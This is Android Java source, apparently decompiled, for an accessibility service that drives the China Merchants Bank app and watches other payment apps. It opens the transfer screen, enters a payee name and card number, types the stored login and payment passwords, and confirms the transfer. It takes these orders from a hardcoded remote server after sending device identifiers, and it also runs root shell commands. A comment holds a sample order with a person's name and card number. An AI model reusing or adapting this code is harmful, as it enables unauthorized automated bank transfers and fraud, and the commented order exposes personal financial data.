package com.position.wyh.position;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.alibaba.fastjson.JSONObject;
import com.position.wyh.position.test.Md5Util;
import com.position.wyh.position.test.StringUtils;
import com.position.wyh.position.utlis.Global;
import com.position.wyh.position.utlis.LogUtils;
import com.position.wyh.position.utlis.OkHttpUtil;
import com.position.wyh.position.utlis.onCallBack;
import com.position.wyh.position.utlis.testUtil;
import com.position.wyh.position.viewpagerindicator.Md5Utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.math.BigDecimal;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class AutoClickService extends AccessibilityServiceZhanShan {
    int durings = 0;
    String lastTradeNo = "";
    TimerTask task = new TimerTask() {
        /* class com.position.wyh.position.AutoClickService.AnonymousClass1 */

        public void run() {
            try {
//                AutoClickService.this.ztLog("===TimerTask=== " + AutoClickService.this.orderScore + " " + knowledgeFragment.started + " tradeNo " + AutoClickService.this.tradeNo + " lastTradeNo " + AutoClickService.this.lastTradeNo + " durings " + AutoClickService.this.durings);
//                if (AutoClickService.this.orderScore == BigDecimal.valueOf(0L) && knowledgeFragment.started) {
//                    AutoClickService.this.ztLog("===TimerTask===11 " + AutoClickService.this.orderScore + " " + knowledgeFragment.started);
//                    AutoClickService.this.taskPost();
//                    AutoClickService.this.performTaskClick();
//                    AutoClickService.this.Sleep(200);
//                    AutoClickService.this.performTaskClick();
//                    AutoClickService.this.lastTradeNo = AutoClickService.this.tradeNo;
//                    AutoClickService.this.durings = 0;
//                } else if (AutoClickService.this.tradeNo.equals(AutoClickService.this.lastTradeNo) && knowledgeFragment.started) {
//                    AutoClickService.this.durings++;
//                }
//                if (AutoClickService.this.durings >= 3) {
//                    AutoClickService.this.performTaskClick();
//                    AutoClickService.this.Sleep(200);
//                    AutoClickService.this.performTaskClick();
//                    AutoClickService.this.durings = 0;
//                }
//                if (!knowledgeFragment.started) {
//                    AutoClickService.this.orderScore = BigDecimal.valueOf(0L);
//                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    Timer timer = new Timer();
    String tradeNo = "";

    public enum State {
        Main,
        Tranfer,
        Bank,
        Accout,
        Conform,
        SMB,
        WAITING,
        Password,
        Login
    }

    public void onInterrupt() {
    }

    /* access modifiers changed from: protected */
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.eventTypes = -1;
        accessibilityServiceInfo.feedbackType = 16;
        accessibilityServiceInfo.packageNames = new String[]{"com.gotokeep.keep", "com.cgbchina.xpt", "com.sinovatech.unicom.ui", "com.tencent.mm", "cmb.pb"};
        accessibilityServiceInfo.notificationTimeout = 100;
        accessibilityServiceInfo.flags |= 8;
        setServiceInfo(accessibilityServiceInfo);
        this.timer.schedule(this.task, 0, 10000);
        ztLog("===onServiceConnected===  ");
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(17:4|5|6|(1:8)|9|10|11|12|13|(2:15|16)|17|19|20|21|22|25|(9:27|28|29|31|32|33|35|36|37)) */
    /* JADX WARNING: Code restructure failed: missing block: B:23:0x00db, code lost:
        r8 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:24:0x00dc, code lost:
        ztLog("Exception12213:" + r8.getMessage());
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:21:0x00b4 */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x012b A[SYNTHETIC, Splitter:B:27:0x012b] */

    boolean isABC = true;
    boolean isQQ = false;
    boolean is123 = true;
    boolean isPwd = true;
    boolean isClickQQ = true;

    @RequiresApi(api = 18)
    public void onAccessibilityEvent(final AccessibilityEvent accessibilityEvent) {
        int eventType = accessibilityEvent.getEventType();
        String charSequence = accessibilityEvent.getPackageName().toString();
        String charSequence2 = accessibilityEvent.getClassName().toString();
        final AccessibilityNodeInfo rootInActiveWindow22 = getRootInActiveWindow();
        testUtil.test(eventType);
        LogUtils.e("======", "=======onAccessibilityEvent--state:" + state);
        if (eventType == 2048 || eventType == 32 || eventType == 4096) {
            if (AccessibilityServiceBase.CATINT == AccessibilityServiceBase.CARINT_ZHAOSHAN) {
                if (state == State.Main) {
                    isExists(rootInActiveWindow22, "快速找回密码", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            state = State.Login;
                        }
                    });
                    findParentClickChild(rootInActiveWindow22, "我的", 2, -1, "", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            Sleep(3000);
                            state = State.Login;
                            LogUtils.e("======", "======完成d点击我的~~~");
                        }
                    });
                } else if (state == State.Login) {
                    isExists(rootInActiveWindow22, "银行卡", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            state = State.Tranfer;
                            LogUtils.e("======", "======已经登录~~~");
                        }
                    });
                    isExists(rootInActiveWindow22, "请输入密码", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            isExists(rootInActiveWindow22, "招商银行安全输入", new onCallBack() {
                                @Override
                                public void onCallBack(Object object) {
                                    final String loginPassword = getSharedPreferences("setting", 0).getString("loginPassword", "");
                                    DFSPasswordLogin(rootInActiveWindow22, "1", "android.widget.Button", loginPassword, new onCallBack() {
                                        @Override
                                        public void onCallBack(Object object) {
                                            DFSExtLogin(rootInActiveWindow22, "android.widget.TextView", "完成", 2, new onCallBack() {
                                                @Override
                                                public void onCallBack(Object object) {
                                                    findParentClickChild(rootInActiveWindow22, "登录", 2, -1, "", new onCallBack() {
                                                        @Override
                                                        public void onCallBack(Object object) {
                                                            state = State.Tranfer;
                                                            LogUtils.e("======", "======完成登录~~~");
                                                        }
                                                    });
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                } else if (state == State.Tranfer) {
                    isExists(rootInActiveWindow22, "频繁操作", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            Sleep(2000);
                            performBackClick();
                        }
                    });

                    findParentClickChild(rootInActiveWindow22, "首页", 2, -1, "", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            LogUtils.e("======", "=======首页--state:" + state);
                        }
                    });

                    findParentClickChild(rootInActiveWindow22, "转账", 2, -1, "", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            LogUtils.e("======", "=======转账--state:" + state);
                        }
                    });

                    findViewEvent(rootInActiveWindow22, "银行账号转账", 2, "", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            LogUtils.e("======", "=======银行账号转账--state:" + state);
                        }
                    });
                    findParentClickChild(rootInActiveWindow22, "户名", 1, 2, bankAccount, new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            LogUtils.e("======", "=======户名--state:" + state);
                        }
                    });
                    findParentClickChild(rootInActiveWindow22, "账号", 1, 2, bankCardNo, new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            state = State.Accout;
                            LogUtils.e("======", "=======账号--state:" + state);
                        }
                    });
                }
                if (state == State.Accout) {
                    Sleep(2000);
                    findViewEvent(rootInActiveWindow22, "0手续费", 2, "0.1", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            DFSPasswordZhaoshan(rootInActiveWindow22, "1", "android.view.View", transMoney, new onCallBack() {
                                @Override
                                public void onCallBack(Object object) {
                                    // String strings = (String) object;
                                    zhanShanInputMoneyInt = zhanShanInputMoneyInt + 1;
                                    LogUtils.e("======", "======str:" + zhanShanInputMoneyInt);
                                    if (zhanShanInputMoneyInt == transMoney.length()) {
                                        //   state = State.Conform;
                                        Sleep(2000);
                                        findViewClickParent(rootInActiveWindow22, "完成", 3, new onCallBack() {
                                            @Override
                                            public void onCallBack(Object object) {
                                                DFSExtLogin(rootInActiveWindow22, "android.widget.Button", "下一步", 2, new onCallBack() {
                                                    @Override
                                                    public void onCallBack(Object object) {
                                                        state = State.Password;
                                                    }
                                                });
                                            }
                                        });
                                    }
                                }
                            });

                        }
                    });
                } else if (state == State.Password) {
                    findViewEvent(rootInActiveWindow22, "继续转账", 2, "", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                        }
                    });
                    final String string = getSharedPreferences("setting", 0).getString("Password", "");
                    DFSPasswordZhaoshan2(rootInActiveWindow22, "1", "android.widget.Button", string, new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            zhanShanPwdInputInt = zhanShanPwdInputInt + 1;
                            if (zhanShanPwdInputInt == string.length()) {
                                DFSExtLogin(rootInActiveWindow22, "android.widget.Button", "确认转账", 2, new onCallBack() {
                                    @Override
                                    public void onCallBack(Object object) {

                                        LogUtils.e("======", "======okkkkkk");
                                    }
                                });
                            }
                        }
                    });
                    isExists(rootInActiveWindow22, "转账成功", new onCallBack() {
                        @Override
                        public void onCallBack(Object object) {
                            state = State.WAITING;
                            performBackClick();
                            Sleep(1000);
                            performBackClick();
                        }
                    });
                }
            } else if (state == State.WAITING) {
                LogUtils.e("======", "=======等待--state:" + state);
            }

            return;
//            if (isClickQQ && state == State.Login) {
//                isExists(getRootInActiveWindow(), "123", new onCallBack() {
//                    @Override
//                    public void onCallBack(Object object) {
//                        // final AccessibilityNodeInfo rootInActiveWindow22 = getRootInActiveWindow();
//                        DFSPasswordLogin(rootInActiveWindow22, "q", "android.widget.TextView", "qq", new onCallBack() {
//                            @Override
//                            public void onCallBack(Object object) {
//                                isClickQQ = false;
//                                DFSExtLogin(rootInActiveWindow22, "android.widget.TextView", "123", 3, null);
//                            }
//                        });
//                    }
//                });
//            }
//            if (eventType == 32 || eventType == 4096) {//TYPE_WINDOW_STATE_CHANGED:32
//                //  ztLog("===start search=== " + charSequence + " " + charSequence2);
//                final AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
//                try {
//                    if (state == State.Login) {
//                        if (rootInActiveWindow != null) {
//                            DFSExtLogin(rootInActiveWindow, "android.widget.EditText", "手机号/身份证号", 1, null);
//                            try {
//                                Thread.sleep(300);
//                            } catch (Exception unused) {
//                            }
//                            DFSExtLogin(rootInActiveWindow, "android.widget.EditText", "请输入登录密码", 2, new onCallBack() {
//                                @Override
//                                public void onCallBack(Object object) {
//
//                                }
//                            });
//                            if (is123) {
//                                DFSExtLogin(rootInActiveWindow, "android.widget.TextView", "ABC", 3, new onCallBack() {
//                                    @Override
//                                    public void onCallBack(Object object) {
//                                        is123 = false;
//                                    }
//                                });
//                            }
//                            isExists(getRootInActiveWindow(), "ABC", new onCallBack() {
//                                @Override
//                                public void onCallBack(Object object) {
//                                    if (isPwd && !isClickQQ) {
//                                        DFSPasswordLogin(rootInActiveWindow, "1", "android.widget.TextView", "202006", new onCallBack() {
//                                            @Override
//                                            public void onCallBack(Object object) {
//                                                isPwd = false;
//                                                DFSExtLogin(rootInActiveWindow, "android.widget.TextView", "完成", 3, new onCallBack() {
//                                                    @Override
//                                                    public void onCallBack(Object object) {
//                                                        state = State.Main;
//                                                    }
//                                                });
//                                            }
//                                        });
//                                    }
//
//                                }
//                            });
//                            ztLog("===state=== 11changed" + this.state);
//                        }
//                    } else {
//                        if (rootInActiveWindow != null) {
//                            DFSExt(rootInActiveWindow, "android.widget.TextView", "转账汇款");
//                            ztLog("===state=== 11changed" + this.state);
//                        }
//                        ztLog("===state=== " + this.state + this.orderScore);
//                        try {
//                            Thread.sleep(500);
//                        } catch (Exception unused) {
//                        }
//                        DFSWebView(accessibilityEvent.getSource(), "android.view.View", "银行卡转账");
//                        ztLog("===state=== 22" + this.state + this.orderScore);
//                        try {
//                            Thread.sleep(500);
//                        } catch (Exception unused2) {
//                        }
//                        DFSbank(accessibilityEvent.getSource(), "android.widget.EditText", "请输入收款人姓名");
//                        Thread.sleep(500);
//                        DFSSMB(accessibilityEvent.getSource(), "android.view.View", "获取验证码");
//                        ztLog("===state=== 22" + this.state + this.orderScore);
//                        Sleep(500);
//                        AccessibilityNodeInfo rootInActiveWindow2 = getRootInActiveWindow();
//                        String string = getSharedPreferences("setting", 0).getString("Password", "");
//                        ztLog("pwd:" + string);
//                        DFSPassword(rootInActiveWindow2, "android.widget.TextView", string);
//                        if (this.state == State.Password) {
//                            try {
//                                Thread.sleep(500);
//                            } catch (Exception unused3) {
//                            }
//                            performBackClick();
//                            try {
//                                Thread.sleep(500);
//                            } catch (Exception unused4) {
//                            }
//                            performBackClick();
//                            try {
//                                Thread.sleep(500);
//                            } catch (Exception unused5) {
//                            }
//                            performBackClick();
//                            this.state = State.Main;
//                            new Thread() {
//                                /* class com.position.wyh.position.AutoClickService.AnonymousClass2 */
//
//                                public void run() {
//                                    AutoClickService.this.deviceNoftify();
//                                    AutoClickService.this.orderScore = BigDecimal.valueOf(0L);
//                                }
//                            }.start();
//                        }
//                    }
//                } catch (Exception e) {
//                    ztLog("Exception1:" + e.getMessage());
//                }
//            }
            //  ztLog("===end search=== " + charSequence + " " + charSequence2);
        }

    }


    private void DFSExt(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            ztLog("rootInfo = class" + accessibilityNodeInfo.getClassName().toString());
            if (accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfo = text " + accessibilityNodeInfo.getText().toString());
                ztLog("rootInfo = text " + accessibilityNodeInfo);
            }
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfo=1 " + accessibilityNodeInfo.getText().toString());
                if (accessibilityNodeInfo.getText().toString().equals(str2)) {
                    performClick(accessibilityNodeInfo.getParent());
                    this.state = State.Tranfer;
                    ztLog("===state=== found" + this.state + this.orderScore);
                    return;
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                DFSExt(accessibilityNodeInfo.getChild(i), str, str2);
            }
        }
    }

    @RequiresApi(api = 24)
    private void DFSTextViewButton(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfo=12 " + accessibilityNodeInfo.getText().toString());
                ztLog("rootInfo=121 " + accessibilityNodeInfo);
                if (accessibilityNodeInfo.getText().toString().equals(str2)) {
                    ztLog("rootInfo=12 " + accessibilityNodeInfo);
                    performClickExt(accessibilityNodeInfo);
                    ztLog("===state=== found" + this.state + this.orderScore);
                    return;
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                DFSTextViewButton(accessibilityNodeInfo.getChild(i), str, str2);
            }
        }
    }

    @RequiresApi(api = 24)
    private void DFSPasswordLogin(AccessibilityNodeInfo accessibilityNodeInfo, String flag, String str, String str2, onCallBack onCallBack) {//flag "1","q"
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfoq=x " + accessibilityNodeInfo.getText().toString() + "-str2:" + str2);

                if (accessibilityNodeInfo.getText().toString().equals(flag)) {
                    LogUtils.e("======", "======1111111111");
                    performClickExt(accessibilityNodeInfo.getParent(), str2, true);
                    //      this.state = State.Login;
                    if (onCallBack != null) {
                        onCallBack.onCallBack(-1);
                    }
                    ztLog("===state=== found" + this.state + this.orderScore + "-String:" + accessibilityNodeInfo.getText().toString());
                    return;
                }
            }
            LogUtils.e("======", "======22222222222");
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                DFSPasswordLogin(accessibilityNodeInfo.getChild(i), flag, str, str2, onCallBack);
            }
        }
    }

    @RequiresApi(api = 24)
    private void DFSButtonLogin(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfo=12 " + accessibilityNodeInfo.getText().toString());
                ztLog("rootInfo=121 " + accessibilityNodeInfo.getText().toString());
                if (accessibilityNodeInfo.getText().toString().equals(str2)) {
                    ztLog("rootInfo=DFSButtonLogin " + accessibilityNodeInfo);
                    performClick(accessibilityNodeInfo);
                    //   this.state = State.Login;
                    ztLog("===state=== found" + this.state + this.orderScore);
                    return;
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                DFSButtonLogin(accessibilityNodeInfo.getChild(i), str, str2);
            }
        }
    }


    @RequiresApi(api = 24)
    private void DFSPassword(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfo=1 " + accessibilityNodeInfo.getText().toString());
                if (accessibilityNodeInfo.getText().toString().equals("1")) {
                    performClickExt(accessibilityNodeInfo.getParent(), str2, true);
                    this.state = State.Password;
                    ztLog("===state=== found" + this.state + this.orderScore);
                    return;
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                DFSPassword(accessibilityNodeInfo.getChild(i), str, str2);
            }
        }
    }

    @RequiresApi(api = 24)
    private void DFSButton(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null) {
                ztLog("rootInfo=12 " + accessibilityNodeInfo.getText().toString());
                ztLog("rootInfo=121 " + accessibilityNodeInfo.getText().toString());
                if (accessibilityNodeInfo.getText().toString().equals(str2)) {
                    ztLog("rootInfo=12 " + accessibilityNodeInfo);
                    performClick(accessibilityNodeInfo);
                    this.state = State.Conform;
                    ztLog("===state=== found" + this.state + this.orderScore);
                    return;
                }
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                DFSButton(accessibilityNodeInfo.getChild(i), str, str2);
            }
        }
    }

    @RequiresApi(api = 24)
    private void DFSWebView(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            ztLog("rootInfo= 22" + accessibilityNodeInfo.getClassName().toString() + " " + accessibilityNodeInfo.isClickable());
            if (!accessibilityNodeInfo.getClassName().equals(str) || accessibilityNodeInfo.getContentDescription() == null || !accessibilityNodeInfo.getContentDescription().toString().equals(str2)) {
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                    DFSWebView(accessibilityNodeInfo.getChild(i), str, str2);
                }
                return;
            }
            performClickExt(accessibilityNodeInfo.getParent().getChild(0));
            this.state = State.Bank;
        }
    }

    @RequiresApi(api = 24)
    private void DFSSMB(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo == null || TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            ztLog("rootInfo= 2213 return");
            return;
        }
        ztLog("rootInfo= 2213" + accessibilityNodeInfo + " " + accessibilityNodeInfo.getChildCount());
        if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getContentDescription() != null) {
            ztLog("rootInfo= 2213 " + accessibilityNodeInfo.getContentDescription().toString());
            if (accessibilityNodeInfo.getContentDescription().toString().equals(str2)) {
                ztLog("rootInfo= 22131 " + accessibilityNodeInfo);
                ztLog("rootInfo= 22131 " + accessibilityNodeInfo.getParent());
                performClick(accessibilityNodeInfo);
                int i = 0;
                while (accessibilityNodeInfo.getParent().getParent().getChild(0).getChild(1).getChild(0).getText() == "请输入短信验证码" && i < 180) {
                    Sleep(3000);
                    i += 3;
                }
                this.state = State.SMB;
                return;
            }
        }
        if (!accessibilityNodeInfo.getClassName().equals("android.widget.Button") || accessibilityNodeInfo.getContentDescription() == null || !accessibilityNodeInfo.getContentDescription().toString().equals("提交")) {
            for (int i2 = 0; i2 < accessibilityNodeInfo.getChildCount(); i2++) {
                DFSSMB(accessibilityNodeInfo.getChild(i2), str, str2);
            }
            return;
        }
        ztLog("rootInfo= 221 " + accessibilityNodeInfo.getParent().getClassName().toString());
        performClick(accessibilityNodeInfo);
        this.state = State.Bank;
    }

    @RequiresApi(api = 24)
    private void DFSbank(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (accessibilityNodeInfo.getClassName().equals(str) && accessibilityNodeInfo.getText() != null && accessibilityNodeInfo.getText().toString().equals(str2)) {
                performInput(accessibilityNodeInfo, this.bankAccount);
                performInput(accessibilityNodeInfo.getParent().getParent().getParent().getChild(4).getChild(1).getChild(0), this.bankCardNo);
                //performClickExt(accessibilityNodeInfo.getParent().getParent().getParent().getChild(5).getChild(1));
                Sleep(800);
                //  performBackClick();
                this.state = State.Accout;
                ztLog("===state=== found" + this.state + this.orderScore);
            } else if (accessibilityNodeInfo.getClassName().equals("android.widget.EditText") && accessibilityNodeInfo.getText() != null && accessibilityNodeInfo.getText().toString().equals("请输入转账金额")) {
                performInput(accessibilityNodeInfo, this.orderScore.toString());
                this.state = State.Accout;
                ztLog("===state=== found1" + this.state + this.orderScore);
            } else if (!accessibilityNodeInfo.getClassName().equals("android.widget.Button") || accessibilityNodeInfo.getContentDescription() == null || !accessibilityNodeInfo.getContentDescription().toString().equals("下一步")) {
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                    DFSbank(accessibilityNodeInfo.getChild(i), str, str2);
                }
            } else {
                performClickExt(accessibilityNodeInfo);
                this.state = State.Accout;
                ztLog("===state=== found12" + this.state + this.orderScore);
            }
        }
    }

    private void DFS(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null && !TextUtils.isEmpty(accessibilityNodeInfo.getClassName())) {
            if (!"android.support.v7.widget.RecyclerView".equals(accessibilityNodeInfo.getClassName())) {
                ztLog("rootInfo=" + accessibilityNodeInfo.getClassName().toString());
                for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                    DFS(accessibilityNodeInfo.getChild(i));
                }
                return;
            }
            ztLog("==find gridView==");
            ztLog("==find GridViewInfo 11==" + ((Object) accessibilityNodeInfo.getClassName()) + accessibilityNodeInfo.getChildCount());
            for (int i2 = 0; i2 < accessibilityNodeInfo.getChildCount(); i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                ztLog("==find GridViewInfo 1==" + ((Object) child.getClassName()) + i2);
                for (int i3 = 0; i3 < child.getChildCount(); i3++) {
                    AccessibilityNodeInfo child2 = child.getChild(i3);
                    ztLog("==find GridViewInfo 112==" + ((Object) child2.getClassName()) + i3);
                    if (child2.getClassName().equals("android.widget.TextView")) {
                        String charSequence = child2.getText().toString();
                        if (charSequence.equals("转账")) {
                            performClick(accessibilityNodeInfo.getChild(0));
                        } else {
                            ztLog("tttt" + charSequence);
                        }
                    }
                }
            }
        }
    }

    public void performBackClick() {
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        performGlobalAction(1);
    }

    public void performTaskClick() {
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        LogUtils.d("GK", "performTaskClick：");
        performGlobalAction(3);
    }

    public void performScrollBackward() {
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        performGlobalAction(8192);
    }

    @RequiresApi(api = 24)
    public void performScrollForward() {
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        performGlobalAction(4096);
    }

    public static void startAlipay(Context context) {
        try {
            Runtime.getRuntime().exec("adb shell am start com.eg.android.AlipayGphone/com.eg.android.AlipayGphone.AlipayLogin");
        } catch (Exception e) {
            e.printStackTrace();
            LogUtils.e("GK", e.getMessage());
        }
    }

    public final void exec(String str) {
        try {
            OutputStream outputStream = Runtime.getRuntime().exec("su").getOutputStream();
            outputStream.write(str.getBytes());
            outputStream.flush();
        } catch (Exception e) {
            e.printStackTrace();
            LogUtils.e("GK", e.getMessage());
        }
    }

    public static void enterForestUI(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtils.d("GK", "enterForestUI ");
        if (accessibilityNodeInfo != null) {
            List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText("转账");
            if (findAccessibilityNodeInfosByText == null) {
                LogUtils.d("GK", "enterForestUI finding no");
                return;
            }
            LogUtils.d("GK", "enterForestUI finding yes");
            for (AccessibilityNodeInfo accessibilityNodeInfo2 : findAccessibilityNodeInfosByText) {
                AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                if (parent != null && parent.isClickable()) {
                    parent.performAction(16);
                    LogUtils.d("GK", "item = " + accessibilityNodeInfo2.toString() + ", parent click = " + parent.toString());
                    return;
                }
            }
        }
    }

    @RequiresApi(api = 18)
    public void policy(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        if (!str.equals("com.eg.android.AlipayGphone") || (!"com.eg.android.AlipayGphone.AlipayLogin".equals(str2) && !"com.alipay.mobile.nebulax.integration.mpaas.activity.NebulaActivity$Main".equals(str2))) {
            ztLog("rootInfo= error  " + str2);
        } else if (accessibilityNodeInfo != null) {
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                ztLog("rootInfo=" + child);
                if ("com.uc.webview.export.WebView".equals(child.getClassName())) {
                    LogUtils.d("GK", "找到蚂蚁森林的 webView count = " + child.getChildCount());
                    ztLog("rootInfo=" + child.getChild(0));
                    findEveryViewNode(child.getChild(0));
                    return;
                }
            }
        } else {
            LogUtils.d("GK", "alipayPolicy = null");
        }
    }

    @RequiresApi(api = 18)
    public static void findEveryViewNode(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null && accessibilityNodeInfo.getChildCount() > 0) {
            LogUtils.d("GK", "findEveryViewNode = " + accessibilityNodeInfo.toString() + " " + accessibilityNodeInfo.getClassName().toString());
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    if ("android.widget.Button".equals(child.getClassName().toString())) {
                        LogUtils.d("GK", "Button 的节点数据 text = " + ((Object) child.getText()) + ", descript = " + ((Object) child.getContentDescription()) + ", className = " + ((Object) child.getClassName()) + ", resId = " + child.getViewIdResourceName());
                        boolean isClickable = child.isClickable();
                        boolean z = child.getViewIdResourceName() == null;
                        if (isClickable && z) {
                            child.performAction(16);
                            LogUtils.d("GK", "能量球 成功点击");
                        }
                    }
                    findEveryViewNode(child);
                }
            }
        }
    }

    public void taskPost() {
        SharedPreferences sharedPreferences = getSharedPreferences("setting", 0);
        String string = sharedPreferences.getString("deviceId", "d23eab596657293008bd9b9d75f935c6");
        String cPUSerial = SettingFragment.getCPUSerial(this);
        String GetDiskId = SettingFragment.GetDiskId();

        HashMap<String, Object> paramMap = new HashMap<String, Object>();
        paramMap.put("deviceNo", string);
        paramMap.put("deviceCpu", cPUSerial);
        paramMap.put("deviceCaliche", GetDiskId);

        //String paramsStr = StringUtils.ascriAsc(paramMap);
        String paramsStr = StringUtils.ascriAsc(paramMap);

        LogUtils.e(TAG, "taskPost: " + paramsStr);
        HashMap<String, String> paramMap2 = new HashMap<>();
        String sign = Md5Util.MD5Encode(paramsStr);
        paramMap2.put("sign", sign);
        paramMap2.put("deviceNo", string);
        String ip = sharedPreferences.getString("IP", "47.242.140.225");
        String s = OkHttpUtil.postSubmitFormsynchronization("http://" + ip + "/api/order/getOrder?", paramMap2);
        // Log.e(TAG, "taskPost: "+s );
        //  String s="{\"msg\":\"操作成功\",\"code\":0,\"data\":{\"bankAccount\":\"刘万松11\",\"subbranchName\":\"江苏省-盐城分行\",\"bankCode\":\"BOCOM\",\"orderScore\":10.0,\"tradeNo\":\"202011051935360189_87cf2c55ef7e5\",\"bankCardNo\":\"6222623290003068945\",\"subbranchCity\":null,\"bankName\":\"交通银行\",\"subbranchProvince\":\"默认\"}}";
        LogUtils.e(TAG, "taskPost: " + s);
        handle(s);
    }

    public String taskPost1() {
        SharedPreferences sharedPreferences = getSharedPreferences("setting", 0);
        String string = sharedPreferences.getString("deviceId", "112233445566");
        String cPUSerial = SettingFragment.getCPUSerial(this);
        String GetDiskId = SettingFragment.GetDiskId();
        HashMap hashMap = new HashMap();
        hashMap.put("deviceNo", string);
        hashMap.put("deviceCpu", cPUSerial);
        hashMap.put("deviceCaliche", GetDiskId);
        String hash = Md5Utils.hash(StringsUtils.sortMapByKeyAsc(hashMap));
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://" + sharedPreferences.getString("IP", "") + "//api//order//getOrder").openConnection();
            LogUtils.d("GK", "HttpURLConnection = " + httpURLConnection);
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setRequestMethod("POST");
            StringBuffer stringBuffer = new StringBuffer();
            String str = "deviceNo=" + string + "&sign=" + hash;
